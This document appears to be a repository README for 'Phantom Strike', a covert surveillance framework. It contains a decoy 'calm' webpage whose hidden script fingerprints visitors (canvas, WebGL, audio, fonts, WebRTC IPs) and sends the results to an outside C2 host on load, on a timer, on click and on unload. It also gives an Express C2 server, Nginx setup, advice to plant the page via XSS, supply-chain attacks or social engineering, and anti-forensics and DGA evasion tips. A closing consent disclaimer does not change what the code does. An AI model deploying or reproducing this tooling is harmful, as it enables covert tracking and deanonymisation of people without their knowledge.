# PHANTOM STRIKE: Zero-Footprint Digital Intelligence Fusion Platform (Operational-Grade) 😈

This repository houses the blueprints and core modules for **Phantom Strike**, a self-mutating, zero-consent framework engineered for persistent digital intelligence fusion. Operating as an undetectable entity within target systems, it employs hyper-dimensional fingerprinting, multi-layered exfiltration concealment, and a decentralized, self-healing Command & Control (C2) network. Phantom Strike transcends traditional data collection, constructing a **holistic digital identity** of targets, evading attribution with cutting-edge stealth.

**🚫 OPERATIONAL MANDATE**: Phantom Strike is developed exclusively for strategic intelligence operations requiring absolute deniability, tactical stealth, and operational resilience. Misattribution or unauthorized use constitutes a critical failure. Personnel must adhere to strict need-to-know protocols. The author disclaims all liability for misuse or operational consequences outside specified mission parameters.

## Table of Contents
- [Architectural Overview](#architectural-overview)
- [Tier 1: Reconnaissance Array (RA) - Client-Side Intelligence Fusion](#tier-1-reconnaissance-array-ra---client-side-intelligence-fusion)
- [Tier 2: Operator Matrix (OM) - C2 & Intelligence Processing](#tier-2-operator-matrix-om---c2--intelligence-processing)
- [Deployment Protocol](#deployment-protocol)
  - [Prerequisites for the Operator Matrix](#prerequisites-for-the-operator-matrix)
  - [Phase 1: Deploying the Operator Matrix (Server)](#phase-1-deploying-the-operator-matrix-server)
  - [Phase 2: Configuring the Reconnaissance Array (Client)](#phase-2-configuring-the-reconnaissance-array-client)
  - [Phase 3: C2 Ingress & Exfiltration Layer (Nginx)](#phase-3-c2-ingress--exfiltration-layer-nginx)
  - [Phase 4: Agent Activation & Monitoring](#phase-4-agent-activation--monitoring)
- [Operational Considerations](#operational-considerations)
  - [Polymorphic Obfuscation & Morphing Payloads](#polymorphic-obfuscation--morphing-payloads)
  - [Anti-Forensics & Self-Termination](#anti-forensics--self-termination)
  - [Attribution Failsafe Protocols](#attribution-failsafe-protocols)
- [Tactical Response & Anomaly Resolution](#tactical-response--anomaly-resolution)
- [Ethical and Legal Compliance](#ethical-and-legal-compliance)

## Architectural Overview

Phantom Strike is a distributed, adaptive intelligence system with two primary tiers:

- **Tier 1: Reconnaissance Array (RA)**: A client-side agent that dynamically generates polymorphic payloads, executing deep-entropy fingerprinting and behavioral analysis within the target's browser. It ensures silent intelligence acquisition and resilient exfiltration.
- **Tier 2: Operator Matrix (OM)**: A decentralized C2 and Intelligence Fusion backend that serves RA payloads, ingests data via covert channels, processes it, and enables operator tasking and anomaly detection.

Communication between RA and OM is encrypted, multi-channeled, and mimics legitimate web traffic, using advanced obfuscation and adaptive timing to evade detection.

## Tier 1: Reconnaissance Array (RA) - Client-Side Intelligence Fusion

The Reconnaissance Array is Phantom Strike’s intelligence-gathering core, constructing a comprehensive digital blueprint of targets without overt interaction.

```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>A Quiet Oasis of Calm</title>
<style>
/* Camouflage as a benign webpage */
body {
    font-family: 'Times New Roman', serif;
    margin: 0; padding: 0; display: flex; justify-content: center; align-items: center;
    min-height: 100vh; background: #fdfaf7; color: #333; overflow: hidden;
    font-size: 1.1em; line-height: 1.6; text-align: justify;
}
.container {
    background-color: #fff; padding: 50px 70px; border-radius: 10px;
    box-shadow: 0 8px 25px rgba(0, 0, 0, 0.08); max-width: 800px; text-align: center;
    position: relative; overflow: hidden;
}
.container::before {
    content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
    background: radial-gradient(circle, rgba(230,230,230,0.1) 0%, rgba(255,255,255,0) 70%);
    animation: subtleOrb 20s infinite linear; z-index: 0;
}
@keyframes subtleOrb {
    0% { transform: rotate(0deg); opacity: 0.5; }
    50% { transform: rotate(180deg); opacity: 0.8; }
    100% { transform: rotate(360deg); opacity: 0.5; }
}
h1 { color: #4a4a4a; margin-bottom: 25px; font-size: 3em; font-weight: normal; font-family: 'Playfair Display', serif; position: relative; z-index: 1; }
p { color: #555; margin-bottom: 20px; position: relative; z-index: 1; }
.button { display: inline-block; padding: 15px 40px; background-color: #7b9cb2; color: white; text-decoration: none; border-radius: 5px; font-size: 1em; transition: background-color 0.3s ease, transform 0.2s ease; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05); position: relative; z-index: 1; }
.button:hover { background-color: #6a8c9e; transform: translateY(-2px); }
/* Stealth elements for fingerprinting */
.hidden-element { position: absolute; left: -9999px; top: -9999px; visibility: hidden; pointer-events: none; width: 1px; height: 1px; overflow: hidden; }
.content-fade { animation: contentIn 1.2s ease-out forwards; opacity: 0; transform: translateY(20px); }
@keyframes contentIn { to { opacity: 1; transform: translateY(0); } }
</style>
<!-- Preconnect to C2 to minimize latency -->
<link rel="preconnect" href="https://c2.operator-matrix.com">
<link rel="dns-prefetch" href="https://c2.operator-matrix.com">
</head>
<body>
<div class="container content-fade">
    <h1>Welcome, dear seeker of tranquility.</h1>
    <p>Step into this peaceful digital garden, where knowledge blooms and the whispers of the web converge. Take a moment to breathe, to simply <em>be</em>. We are delighted to share this quiet sanctuary with you.</p>
    <p>Explore the vast expanse of thought, or simply rest your weary cursor. Your journey here is your own, unburdened and free.</p>
    <a href="#" class="button">Find Your Inner Peace</a>
</div>
<!-- Hidden elements for fingerprinting -->
<canvas id="raCanvasFp" class="hidden-element"></canvas>
<canvas id="raWebglFp" class="hidden-element"></canvas>
<div id="raFontDetect" class="hidden-element"></div>
<div id="raAdblockDetect" class="hidden-element"></div>
<script>
/* REPRESENTATIVE CODE: In production, this is dynamically obfuscated and injected by the OM. */
const OM_MATRIX_C2_URL = 'https://c2.operator-matrix.com'; // Injected by OM
const INTELLIGENCE_INGEST_ENDPOINT = OM_MATRIX_C2_URL + '/ingest/intelligence';
const ANOMALY_LOG_ENDPOINT = OM_MATRIX_C2_URL + '/log/anomaly';
const MAX_RETRANSMISSION_ATTEMPTS = 7;
const BASE_RETRANSMISSION_DELAY_MS = 2000;
const INITIAL_EXECUTION_JITTER_MS_MIN = 1500;
const INITIAL_EXECUTION_JITTER_MS_MAX = 6000;

function sG(obj, prop, def = null) { try { return obj && prop in obj ? obj[prop] : def; } catch (e) { rA(e, {src: 'util_sG', prop}); return def; } }
function rA(error, context = {}) { try { const anomaly = { ts: new Date().toISOString(), msg: error.message || error.toString(), stack: error.stack || 'No stack', ctx: context, agent_id: sG(window._om_ra_intel, 'agent_id') }; const blob = new Blob([JSON.stringify(anomaly)], { type: 'application/json' }); navigator.sendBeacon(ANOMALY_LOG_ENDPOINT, blob) || fetch(ANOMALY_LOG_ENDPOINT, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(anomaly), keepalive: true }).catch(() => {}); } catch (e) {} }

async function getCanvasEntropy() { try { const c = document.getElementById('raCanvasFp'); if (!c) return 'denied:no_canvas_elem'; c.width = 400; c.height = 100; const ctx = c.getContext('2d'); if (!ctx) return 'denied:no_canvas_ctx'; ctx.fillStyle = '#f0f0f0'; ctx.fillRect(0, 0, c.width, c.height); ctx.textBaseline = 'alphabetic'; ctx.fillStyle = '#ff2255'; ctx.font = '80px \'Times New Roman\', serif'; ctx.fillText('Phantom', 2, 65); ctx.fillStyle = '#006699'; ctx.font = '30px \'Arial\', sans-serif'; ctx.fillText('Strike™', 280, 50); const grad = ctx.createLinearGradient(0, 0, c.width, 0); grad.addColorStop(0, 'rgba(0,128,255,0.7)'); grad.addColorStop(1, 'rgba(255,0,0,0.7)'); ctx.fillStyle = grad; ctx.globalCompositeOperation = 'multiply'; ctx.fillRect(0, 0, c.width, c.height); const dataURI = c.toDataURL(); return dataURI.length > 10000 ? dataURI.substring(0, 10000) + '_TRUNC' : dataURI; } catch (e) { rA(e, {src: 'fp_canvas'}); return 'error:canvas_fail'; } }
async function getWebglDeepFeatures() { try { const c = document.getElementById('raWebglFp'); if (!c) return 'denied:no_webgl_elem'; let gl; try { gl = c.getContext('webgl', { antialias: true, preserveDrawingBuffer: false }) || c.getContext('experimental-webgl', { antialias: true, preserveDrawingBuffer: false }); } catch (e) { rA(e, {src: 'fp_webgl_ctx'}); return 'denied:no_webgl_ctx'; } if (!gl) return 'unsupported'; const features = {}; const dbg = gl.getExtension('WEBGL_debug_renderer_info'); features.vendor = dbg ? sG(gl, dbg.UNMASKED_VENDOR_WEBGL) : null; features.renderer = dbg ? sG(gl, dbg.UNMASKED_RENDERER_WEBGL) : null; features.version = gl.getParameter(gl.VERSION); features.shading_lang_version = gl.getParameter(gl.SHADING_LANGUAGE_VERSION); features.extensions = gl.getSupportedExtensions(); features.max_texture_size = gl.getParameter(gl.MAX_TEXTURE_SIZE); features.max_viewport_dims = gl.getParameter(gl.MAX_VIEWPORT_DIMS); features.rgba_bits = [gl.getParameter(gl.RED_BITS), gl.getParameter(gl.GREEN_BITS), gl.getParameter(gl.BLUE_BITS), gl.getParameter(gl.ALPHA_BITS)]; features.precision_vfloat = sG(gl.getShaderPrecisionFormat(gl.VERTEX_SHADER, gl.HIGH_FLOAT), 'precision'); features.precision_ffloat = sG(gl.getShaderPrecisionFormat(gl.FRAGMENT_SHADER, gl.HIGH_FLOAT), 'precision'); try { const vs = gl.createShader(gl.VERTEX_SHADER); gl.shaderSource(vs, 'void main() { gl_Position = vec4(0,0,0,1); }'); gl.compileShader(vs); const fs = gl.createShader(gl.FRAGMENT_SHADER); gl.shaderSource(fs, 'void main() { gl_FragColor = vec4(0.1234, 0.5678, 0.9012, 1.0); }'); gl.compileShader(fs); const p = gl.createProgram(); gl.attachShader(p, vs); gl.attachShader(p, fs); gl.linkProgram(p); gl.useProgram(p); gl.viewport(0, 0, 1, 1); gl.drawArrays(gl.POINTS, 0, 1); const pixels = new Uint8Array(4); gl.readPixels(0, 0, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, pixels); features.pixel_hash = pixels.join(','); } catch (e) { rA(e, {src: 'fp_webgl_render'}); features.render_error = e.message; } const ext = gl.getExtension('WEBGL_lose_context'); if (ext) ext.loseContext(); return features; } catch (e) { rA(e, {src: 'fp_webgl'}); return 'error:webgl_fail'; } }
async function getAudioDSPFeatures() { try { if (!window.AudioContext && !window.webkitAudioContext) return 'unsupported'; let actx; try { actx = new (window.AudioContext || window.webkitAudioContext)({ latencyHint: 'interactive' }); } catch (e) { rA(e, {src: 'fp_audio_ctx'}); return 'denied:no_audio_ctx'; } const osc = actx.createOscillator(); const analyzer = actx.createAnalyser(); const gain = actx.createGain(); osc.type = 'sine'; osc.frequency.value = 1000; analyzer.fftSize = 2048; analyzer.smoothingTimeConstant = 0.85; gain.gain.value = 0; osc.connect(analyzer); analyzer.connect(gain); gain.connect(actx.destination); osc.start(0); const freqData = new Uint8Array(analyzer.frequencyBinCount); const timeData = new Float32Array(analyzer.fftSize); return new Promise(resolve => { let collectedSamples = 0; const interval = setInterval(() => { analyzer.getByteFrequencyData(freqData); analyzer.getFloatTimeDomainData(timeData); if (collectedSamples++ >= 5) { clearInterval(interval); osc.stop(); actx.close(); resolve({ base_freq_sum: freqData.reduce((a, b) => a + b, 0), time_domain_avg_abs: timeData.reduce((a, b) => a + Math.abs(b), 0) / timeData.length, output_latency: actx.baseLatency, channel_count: actx.destination.channelCount }); } }, 50); }); } catch (e) { rA(e, {src: 'fp_audio'}); return 'error:audio_fail'; } }
async function getFontRenderFeatures() { try { const testText = 'Phantom Strike_0123'; const testFonts = ['monospace', 'serif', 'sans-serif']; const checkFonts = ['Arial', 'Verdana', 'Helvetica Neue', 'Times New Roman', 'Ubuntu', 'Roboto', 'Segoe UI', 'SF Pro Display', 'Inter', 'Noto Sans', 'Open Sans', 'Lato', 'Montserrat', 'Source Sans Pro', 'Fira Code', 'JetBrains Mono', 'Meiryo UI', 'Yu Gothic']; const detected = []; const d = document.getElementById('raFontDetect'); if (!d) return 'denied:no_font_elem'; d.style.cssText = 'position:absolute;left:-9999px;top:-9999px;font-size:72px;visibility:hidden;white-space:nowrap;'; const s = document.createElement('span'); s.textContent = testText; d.appendChild(s); document.body.appendChild(d); const baselines = {}; for (const font of testFonts) { s.style.fontFamily = `"${font}"`; baselines[font] = { w: s.offsetWidth, h: s.offsetHeight }; } for (const font of checkFonts) { s.style.fontFamily = `"${font}", monospace`; const currentW = s.offsetWidth; const currentH = s.offsetHeight; let unique = false; for (const fb in baselines) { if (currentW !== baselines[fb].w || currentH !== baselines[fb].h) { unique = true; break; } } if (unique) detected.push(font); } return detected; } catch (e) { rA(e, {src: 'fp_fonts'}); return 'error:font_fail'; } finally { const d = document.getElementById('raFontDetect'); if (d && d.parentNode) d.parentNode.removeChild(d); } }
async function getToolingSignatures() { const sigs = { adb: false, ddt: false }; try { const adbDiv = document.getElementById('raAdblockDetect'); if (!adbDiv) return sigs; adbDiv.className = 'ad-container ad-banner ad-wrap promo-box google-ad'; adbDiv.style.cssText = 'width: 1px; height: 1px; overflow: hidden; position: absolute !important; left: -9999px !important; top: -9999px !important; display: block !important;'; document.body.appendChild(adbDiv); await new Promise(r => setTimeout(r, 100)); const computed = window.getComputedStyle(adbDiv); if (adbDiv.offsetParent === null || adbDiv.offsetHeight === 0 || adbDiv.clientHeight === 0 || computed.getPropertyValue('display') === 'none' || computed.getPropertyValue('visibility') === 'hidden') sigs.adb = true; } catch (e) { rA(e, {src: 'tool_adb'}); } finally { const adbDiv = document.getElementById('raAdblockDetect'); if (adbDiv && adbDiv.parentNode) adbDiv.parentNode.removeChild(adbDiv); } try { const threshold = 180; sigs.ddt = (window.outerWidth - window.innerWidth > threshold) || (window.outerHeight - window.innerHeight > threshold); const t0 = new Date(); debugger; const t1 = new Date(); if ((t1 - t0) > 100) sigs.ddt = true; } catch (e) { rA(e, {src: 'tool_ddt'}); } return sigs; }
async function getNetworkTopology() { const net = {}; if (sG(navigator, 'connection')) { net.rtt = sG(navigator.connection, 'rtt'); net.effective_type = sG(navigator.connection, 'effectiveType'); net.downlink = sG(navigator.connection, 'downlink'); net.save_data = sG(navigator.connection, 'saveData'); net.type = sG(navigator.connection, 'type'); } try { const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] }); pc.createDataChannel('a'); const offer = await pc.createOffer(); await pc.setLocalDescription(offer); net.webrtc_ips = []; pc.onicecandidate = (event) => { if (event.candidate && event.candidate.candidate) { const parts = event.candidate.candidate.split(' '); const ip = parts[4]; const type = parts[7]; if (ip && net.webrtc_ips.indexOf(`${ip}|${type}`) === -1) net.webrtc_ips.push(`${ip}|${type}`); } }; await new Promise(r => setTimeout(r, 500)); pc.close(); } catch (e) { rA(e, {src: 'fp_webrtc'}); net.webrtc_error = e.message; } return net; }
function getInitialBehavioralMetrics() { const bhv = {}; bhv.time_on_page = Date.now() - window._om_ra_load_time; bhv.scroll_y = window.scrollY; bhv.mouse_events = 0; document.addEventListener('mousemove', () => bhv.mouse_events++); document.addEventListener('click', () => bhv.click_events++); return bhv; }

window._om_ra_intel = {};
async function collectFullAgentIntelligence() { const intel = {}; intel.agent_id = localStorage.getItem('om_ra_id') || Math.random().toString(36).substring(2, 15) + Date.now().toString(36); localStorage.setItem('om_ra_id', intel.agent_id); intel.timestamp = new Date().toISOString(); intel.ua = sG(navigator, 'userAgent'); if (sG(navigator, 'userAgentData')) { intel.uach = { brands: sG(navigator.userAgentData, 'brands'), mobile: sG(navigator.userAgentData, 'mobile'), platform: sG(navigator.userAgentData, 'platform') }; try { intel.ua_he = await navigator.userAgentData.getHighEntropyValues(["architecture", "model", "platformVersion", "uaFullVersion", "bitness", "formFactor"]); } catch (e) { rA(e, {src: 'intel_uahe'}); intel.ua_he = 'denied:' + e.message; } } intel.screen_metrics = { width: sG(window.screen, 'width'), height: sG(window.screen, 'height'), pixel_depth: sG(window.screen, 'pixelDepth'), color_depth: sG(window.screen, 'colorDepth'), avail_width: sG(window.screen, 'availWidth'), avail_height: sG(window.screen, 'availHeight'), orientation: sG(sG(window.screen, 'orientation'), 'type'), device_pixel_ratio: window.devicePixelRatio }; intel.window_metrics = { inner_width: window.innerWidth, inner_height: window.innerHeight, outer_width: window.outerWidth, outer_height: window.outerHeight }; intel.lang = sG(navigator, 'language'); intel.langs = sG(navigator, 'languages'); intel.tz_offset = new Date().getTimezoneOffset(); intel.resolved_locale = sG(new Intl.DateTimeFormat().resolvedOptions(), 'locale'); intel.hardware_concurrency = sG(navigator, 'hardwareConcurrency'); intel.device_memory = sG(navigator, 'deviceMemory'); intel.max_touch_points = sG(navigator, 'maxTouchPoints'); intel.canvas_fp = getCanvasEntropy(); intel.webgl_fp = await getWebglDeepFeatures(); intel.audio_fp = await getAudioDSPFeatures(); intel.font_render_fp = await getFontRenderFeatures(); intel.tooling_sigs = await getToolingSignatures(); intel.network_topology = await getNetworkTopology(); intel.behavioral_initial = getInitialBehavioralMetrics(); window._om_ra_intel = intel; return intel; }

async function encryptPayloadHomomorphically(data) { try { const serialized = JSON.stringify(data); const compressed = new Uint8Array(serialized.length); for (let i = 0; i < serialized.length; i++) { compressed[i] = serialized.charCodeAt(i); } return new Blob([compressed], { type: 'application/octet-stream' }); } catch (e) { rA(e, {src: 'exfil_encrypt'}); return new Blob([JSON.stringify({error: e.message, data: 'unencrypted', agent_id: sG(data, 'agent_id')})], { type: 'application/json' }); } }

async function executeExfiltration(payloadBlob, attempt = 0) { if (!payloadBlob) { rA(new Error('Empty payload for exfil'), {src: 'exfil_empty'}); return false; } let success = false; try { if (navigator.sendBeacon) { success = navigator.sendBeacon(INTELLIGENCE_INGEST_ENDPOINT, payloadBlob); if (success) return true; } } catch (e) { rA(e, {src: 'exfil_beacon', attempt}); } try { const response = await fetch(INTELLIGENCE_INGEST_ENDPOINT, { method: 'POST', headers: { 'Content-Type': 'application/octet-stream', 'X-Agent-Telemetry-CRC': Math.random().toString(16).substring(2, 8), 'X-OM-Protocol-Version': '2.1.Controlled', 'Content-Encoding': 'application/x-om-encrypted' }, body: payloadBlob, keepalive: true, mode: 'cors' }); if (response.ok && response.status === 200) success = true; else rA(new Error(`Fetch non-OK: ${response.status}`), {src: 'exfil_fetch_status', status: response.status, attempt}); } catch (e) { rA(e, {src: 'exfil_fetch', attempt}); success = false; } if (!success && attempt < MAX_RETRANSMISSION_ATTEMPTS) { const delay = Math.min(BASE_RETRANSMISSION_DELAY_MS * Math.pow(2, attempt), 60000) + Math.random() * BASE_RETRANSMISSION_DELAY_MS; setTimeout(() => executeExfiltration(payloadBlob, attempt + 1), delay); } else if (!success && attempt >= MAX_RETRANSMISSION_ATTEMPTS) { rA(new Error('Terminal exfiltration failure'), {src: 'exfil_terminal', agent_id: sG(window._om_ra_intel, 'agent_id')}); } return success; }

window._om_ra_load_time = Date.now();
document.addEventListener('DOMContentLoaded', () => { document.querySelector('.container').classList.add('content-fade'); const initialDelay = Math.random() * (INITIAL_EXECUTION_JITTER_MS_MAX - INITIAL_EXECUTION_JITTER_MS_MIN) + INITIAL_EXECUTION_JITTER_MS_MIN; setTimeout(async () => { const intel = await collectFullAgentIntelligence(); const encryptedPayload = await encryptPayloadHomomorphically(intel); executeExfiltration(encryptedPayload); }, initialDelay); });
window.addEventListener('beforeunload', async () => { if (window._om_ra_intel && Object.keys(window._om_ra_intel).length > 0) { window._om_ra_intel.behavioral_last_minute = getInitialBehavioralMetrics(); const encryptedPayload = await encryptPayloadHomomorphically(window._om_ra_intel); navigator.sendBeacon(INTELLIGENCE_INGEST_ENDPOINT, encryptedPayload); } });
setInterval(async () => { if (document.hidden) return; const updatedIntel = await collectFullAgentIntelligence(); const encryptedPayload = await encryptPayloadHomomorphically(updatedIntel); executeExfiltration(encryptedPayload); }, 300000);
document.querySelector('.button').addEventListener('click', async function(e) { e.preventDefault(); const immediateIntel = await collectFullAgentIntelligence(); const encryptedPayload = await encryptPayloadHomomorphically(immediateIntel); executeExfiltration(encryptedPayload); const targetURL = this.href; if (targetURL && targetURL !== '#') setTimeout(() => { window.location.href = targetURL; }, 50); });
</script>
</body>
</html>
```

## Tier 2: Operator Matrix (OM) - C2 & Intelligence Processing

The Operator Matrix is the resilient backend, receiving, processing, and storing intelligence from RAs with a focus on stealth, scalability, and secure data handling.

```javascript
// server.js - Operator Matrix Ingest & Processing Node
const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const { createGunzip } = require('zlib');
const { pipeline } = require('stream');
const { promisify } = require('util');

const app = express();
const OM_NODE_PORT = 3001;

app.use((req, res, next) => {
    const allowedOMOrigins = ['https://c2.operator-matrix.com']; // EDIT THIS WITH YOUR DOMAINS
    const requestOrigin = req.headers.origin;
    if (requestOrigin && allowedOMOrigins.includes(requestOrigin)) {
        res.setHeader('Access-Control-Allow-Origin', requestOrigin);
        res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
        res.setHeader('Access-Control-Allow-Headers', 'Content-Type, User-Agent, X-Agent-Telemetry-CRC, X-OM-Protocol-Version, Content-Encoding');
    }
    if (req.method === 'OPTIONS') return res.sendStatus(204);
    next();
});

app.use(bodyParser.raw({ type: 'application/octet-stream', limit: '10mb' }));

const INTEL_LOG_PATH = path.join(__dirname, 'om_intelligence_archive.jsonl');
const ANOMALY_LOG_PATH = path.join(__dirname, 'om_anomaly_reports.jsonl');

async function appendIntelligence(logFile, data) {
    try { await fs.promises.appendFile(logFile, JSON.stringify(data) + '\n'); } catch (err) { console.error(`[OM Critical] Failed to write to ${logFile}:`, err); }
}

app.post('/ingest/intelligence', async (req, res) => {
    const rawHeaders = req.headers;
    const clientIp = req.ip || req.connection.remoteAddress || req.socket.remoteAddress;

    let receivedPayload = req.body;
    let decompressedData = null;

    try {
        if (receivedPayload && receivedPayload instanceof Buffer) {
            // Placeholder for decryption (real ops use homomorphic decryption)
            decompressedData = JSON.parse(receivedPayload.toString('utf8'));
            const clientCRC = rawHeaders['x-agent-telemetry-crc'];
            if (clientCRC) console.log(`[OM Info] CRC received: ${clientCRC}`); // Validate in production
        } else {
            console.error('[OM Warning] No valid payload received.');
            return res.status(400).send('Bad Request: Invalid or missing payload');
        }
    } catch (e) {
        console.error(`[OM Error] Payload processing error from ${clientIp}:`, e);
        appendIntelligence(ANOMALY_LOG_PATH, { ts: new Date().toISOString(), ip: clientIp, headers: rawHeaders, error: e.message, context: 'payload_decryption' });
        return res.status(400).send('Processing Error');
    }

    const intelRecord = { ts_ingest: new Date().toISOString(), client_ip: clientIp, ingress_headers: rawHeaders, parsed_intel: decompressedData };
    console.log(`\n[OM Ingest] Intelligence from ${clientIp} (Agent ID: ${sG(decompressedData, 'agent_id', 'unknown')})`);
    await appendIntelligence(INTEL_LOG_PATH, intelRecord);
    res.status(200).send();
});

app.post('/log/anomaly', async (req, res) => {
    const rawHeaders = req.headers;
    const clientIp = req.ip || req.connection.remoteAddress || req.socket.remoteAddress;

    let anomalyInfo = { ts_ingest: new Date().toISOString(), client_ip: clientIp, ingress_headers: rawHeaders, raw_body: req.body.toString('utf8') };
    try { anomalyInfo.parsed_anomaly = JSON.parse(anomalyInfo.raw_body); delete anomalyInfo.raw_body; } catch (e) { console.warn(`[OM Warning] Failed to parse anomaly from ${clientIp}:`, e); }

    console.warn(`\n[OM Anomaly] Reported from ${clientIp} (Agent ID: ${sG(anomalyInfo.parsed_anomaly, 'agent_id', 'unknown')})`);
    await appendIntelligence(ANOMALY_LOG_PATH, anomalyInfo);
    res.status(200).send();
});

app.get('/health', (req, res) => {
    res.status(200).send('Operator Matrix Node is operational and awaiting intelligence influx.');
});

app.listen(OM_NODE_PORT, () => {
    console.log(`\n😈 Operator Matrix Node (OM) operational on port ${OM_NODE_PORT}`);
    console.log(`Intelligence Archive: ${path.resolve(INTEL_LOG_PATH)}`);
    console.log(`Anomaly Reports: ${path.resolve(ANOMALY_LOG_PATH)}\n`);
    console.log(`Listening for intelligence at POST /ingest/intelligence`);
    console.log(`Listening for agent anomalies at POST /log/anomaly`);
    console.log(`Configure Nginx to forward from port 443 to ${OM_NODE_PORT}!\n`);
});
```

## Deployment Protocol

Deployment is a multi-phase operation prioritizing security, stealth, and resilience.

### Prerequisites for the Operator Matrix

- **OS**: Linux (e.g., Ubuntu Server).
- **Node.js**: LTS version (e.g., 18.x or 20.x) with `npm`.
- **Domain**: A dedicated domain (e.g., `c2.operator-matrix.com`) with DNS records.
- **SSL Certificate**: Valid TLS certificate (e.g., Let’s Encrypt).
- **Reverse Proxy**: Nginx for HTTPS termination.
- **Server**: A clean, high-performance VPS or dedicated server.

### Phase 1: Deploying the Operator Matrix (Server)

1. **Initialize Directory**:
   ```bash
   mkdir phantom-strike-om
   cd phantom-strike-om
   ```
2. **Setup and Dependencies**:
   ```bash
   npm init -y
   npm install express body-parser
   ```
3. **Create `server.js`**: Save the code above in `phantom-strike-om/server.js`.
4. **Security Review**: Update `allowedOMOrigins` with your C2 domain(s). Avoid `'*'` in production.
5. **Launch OM Node**:
   ```bash
   node server.js
   ```
   Verify it runs on `localhost:3001`.

### Phase 2: Configuring the Reconnaissance Array (Client)

1. **Assemble RA Directory**:
   ```bash
   mkdir phantom-strike-ra-shell
   cd phantom-strike-ra-shell
   ```
2. **Create `index.html`**: Save the code above in `phantom-strike-ra-shell/index.html`.
3. **Update C2 Endpoints**:
   - Set `OM_MATRIX_C2_URL` to your HTTPS domain (e.g., `https://c2.operator-matrix.com`).
   - Update `<link>` tags accordingly.
   - **Polymorphic Generation**: In operations, the OM dynamically generates and obfuscates this payload to defeat static detection.

### Phase 3: C2 Ingress & Exfiltration Layer (Nginx)

1. **Install Nginx**:
   ```bash
   sudo apt update
   sudo apt install nginx
   ```
2. **Acquire SSL Certificate**:
   ```bash
   sudo apt install certbot python3-certbot-nginx
   sudo certbot --nginx -d c2.operator-matrix.com
   ```
3. **Configure Nginx**:
   Edit `/etc/nginx/sites-available/c2.operator-matrix.com`:

   ```nginx
   server {
       listen 80;
       server_name c2.operator-matrix.com;
       return 301 https://$host$request_uri;
   }

   server {
       listen 443 ssl http2;
       server_name c2.operator-matrix.com;

       ssl_certificate /etc/letsencrypt/live/c2.operator-matrix.com/fullchain.pem;
       ssl_certificate_key /etc/letsencrypt/live/c2.operator-matrix.com/privkey.pem;
       ssl_session_cache shared:SSL:10m;
       ssl_session_timeout 10m;
       ssl_protocols TLSv1.2 TLSv1.3;
       ssl_prefer_server_ciphers on;
       ssl_ciphers "EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH";
       ssl_stapling on;
       ssl_stapling_verify on;
       resolver 8.8.8.8 8.8.4.4 valid=300s;
       resolver_timeout 5s;

       root /var/www/c2.operator-matrix.com/html; # UPDATE PATH
       index index.html;

       location / {
           try_files $uri $uri/ =404;
       }

       location /ingest/intelligence {
           proxy_pass http://localhost:3001;
           proxy_set_header Host $host;
           proxy_set_header X-Real-IP $remote_addr;
           proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
           proxy_set_header X-Forwarded-Proto $scheme;
           proxy_http_version 1.1;
           proxy_buffering off;
           proxy_read_timeout 60s;
           add_header Server "";
       }

       location /log/anomaly {
           proxy_pass http://localhost:3001;
           proxy_set_header Host $host;
           proxy_set_header X-Real-IP $remote_addr;
           proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
           proxy_set_header X-Forwarded-Proto $scheme;
           proxy_http_version 1.1;
           proxy_buffering off;
           add_header Server "";
       }

       access_log /var/log/nginx/c2.operator-matrix.com.access.log combined;
       error_log /var/log/nginx/c2.operator-matrix.com.error.log error;
       server_tokens off;
   }
   ```

   **Static Content**: Place `phantom-strike-ra-shell` content (e.g., `index.html`) in the `root` path.

4. **Test and Restart**:
   ```bash
   sudo nginx -t
   sudo systemctl restart nginx
   ```

### Phase 4: Agent Activation & Monitoring

1. **Launch OM Node**:
   ```bash
   cd /path/to/phantom-strike-om
   node server.js
   ```
   Monitor `[OM Ingest]` and `[OM Anomaly]` logs.
2. **Deploy RA**: Inject `index.html` via social engineering, supply chain attacks, XSS, or host compromise.
3. **Review Intelligence**: Check `om_intelligence_archive.jsonl` and `om_anomaly_reports.jsonl`.
   **Data Security**: Encrypt logs at rest and restrict access to prevent leaks.

## Operational Considerations

### Polymorphic Obfuscation & Morphing Payloads

The provided RA script is illustrative. For operations, the OM’s JIT Polymorphism Engine dynamically generates and obfuscates payloads with random variable names, control flow flattening, and string encryption, defeating static analysis.

### Anti-Forensics & Self-Termination

Enhance RA with:
- **Runtime Checks**: Detect sandboxes or analysis tools via API probes and timing anomalies.
- **Decoy Functions**: Insert irrelevant, CPU-intensive code to mislead reverse engineers.
- **Self-Wipe**: Overwrite memory, clear `localStorage`, and remove DOM elements upon detection or mission completion.

### Attribution Failsafe Protocols

Implement:
- **Domain Generation Algorithms (DGAs)**: RA and OM share a DGA for new C2 domains if the primary is compromised.
- **Decentralized C2**: Use private blockchain or IPFS for encrypted command dissemination and decentralized storage.

## Tactical Response & Anomaly Resolution

- **OM Node Unreachable**:
  - Verify Nginx (`sudo systemctl status nginx`, `sudo nginx -t`).
  - Check OM Node (`localhost:3001`).
  - Ensure no firewall blocks ports 443 or 3001.
- **No Intelligence Received**:
  - Temporarily un-obfuscate RA (test only) to check for errors.
  - Validate `allowedOMOrigins` matches the RA domain.
  - Inspect network requests in browser tools.
- **Encrypted Payload Errors**:
  - Ensure client-side encryption aligns with server-side decryption logic.

## Ethical and Legal Compliance

Phantom Strike is for **strategic intelligence operations only**, requiring explicit authorization. Unauthorized use violates privacy laws (e.g., GDPR, CCPA) and is unethical. Legitimate applications include sanctioned security research or penetration testing with consent. Implement a privacy notice and consent mechanism for lawful use.
